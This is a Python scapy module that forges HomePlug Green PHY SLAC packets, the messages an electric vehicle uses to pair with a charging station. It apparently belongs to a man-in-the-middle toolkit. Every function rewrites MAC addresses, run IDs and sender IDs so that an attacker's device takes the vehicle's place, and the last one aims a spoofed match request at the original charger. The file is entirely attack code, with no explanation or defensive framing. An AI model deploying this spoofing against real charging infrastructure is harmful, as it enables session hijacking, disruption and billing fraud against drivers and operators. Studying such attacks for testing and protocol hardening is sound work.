import random
from scapy.all import Ether
from scapy.contrib.homepluggp import CM_SLAC_PARM_REQ, CM_START_ATTEN_CHAR_IND, CM_MNBC_SOUND_IND, CM_ATTEN_CHAR_RSP, CM_SLAC_MATCH_REQ
from general_simulate_packets import send_packet, str_with_colon_to_bytes

def duplicate_parm_req(packet, sending_interface, mitm_ev_mac, mitm_ev_run_id):
    if packet.haslayer(Ether) and packet.haslayer(CM_SLAC_PARM_REQ):
        packet[Ether].src = mitm_ev_mac
        packet[CM_SLAC_PARM_REQ].RunID = str_with_colon_to_bytes(mitm_ev_run_id)
        send_packet(packet, sending_interface)

def duplicate_start_atten_char_ind(packet, sending_interface, mitm_ev_mac, mitm_ev_run_id):
    if packet.haslayer(Ether) and packet.haslayer(CM_START_ATTEN_CHAR_IND):
        packet[Ether].src = mitm_ev_mac
        packet[CM_START_ATTEN_CHAR_IND].ForwardingSTA = mitm_ev_mac
        packet[CM_START_ATTEN_CHAR_IND].RunID = str_with_colon_to_bytes(mitm_ev_run_id)
        send_packet(packet, sending_interface)

def duplicate_mnbc_sound_ind(packet, sending_interface, mitm_ev_mac, mitm_ev_run_id, mitm_ev_sender_id):
    if packet.haslayer(Ether) and packet.haslayer(CM_MNBC_SOUND_IND):
        packet[Ether].src = mitm_ev_mac
        packet[CM_MNBC_SOUND_IND].RunID = str_with_colon_to_bytes(mitm_ev_run_id)
        packet[CM_MNBC_SOUND_IND].SenderID = str_with_colon_to_bytes(mitm_ev_sender_id)
        random_bytes = get_random_sounding_value()
        packet[CM_MNBC_SOUND_IND].RandomValue = random_bytes
        send_packet(packet, sending_interface)

def get_random_sounding_value():
    return bytearray(random.getrandbits(8) for _ in range(16))

def duplicate_cm_atten_char_rsp(packet, sending_interface, mitm_ev_mac, mitm_ev_run_id, mitm_ev_sender_id):
    if packet.haslayer(Ether) and packet.haslayer(CM_ATTEN_CHAR_RSP):
        packet[Ether].src = mitm_ev_mac
        packet[CM_ATTEN_CHAR_RSP].RunID = str_with_colon_to_bytes(mitm_ev_run_id)
        packet[CM_ATTEN_CHAR_RSP].SourceID = str_with_colon_to_bytes(mitm_ev_sender_id)
        packet[CM_ATTEN_CHAR_RSP].SourceAdress = mitm_ev_mac
        send_packet(packet, sending_interface)

def duplicate_cm_slac_match_req(packet, sending_interface, mitm_ev_mac, mitm_ev_run_id, mitm_ev_sender_id, original_evse_id, original_evse_mac):
    if packet.haslayer(Ether) and packet.haslayer(CM_SLAC_MATCH_REQ):
        packet[Ether].src = mitm_ev_mac
        packet[Ether].dst = original_evse_mac
        packet[CM_SLAC_MATCH_REQ].VariableField.EVID = mitm_ev_sender_id
        packet[CM_SLAC_MATCH_REQ].VariableField.EVMAC = mitm_ev_mac
        packet[CM_SLAC_MATCH_REQ].VariableField.EVSEID = original_evse_id
        packet[CM_SLAC_MATCH_REQ].VariableField.EVSEMAC = original_evse_mac
        packet[CM_SLAC_MATCH_REQ].VariableField.RunID = mitm_ev_run_id
        send_packet(packet, sending_interface)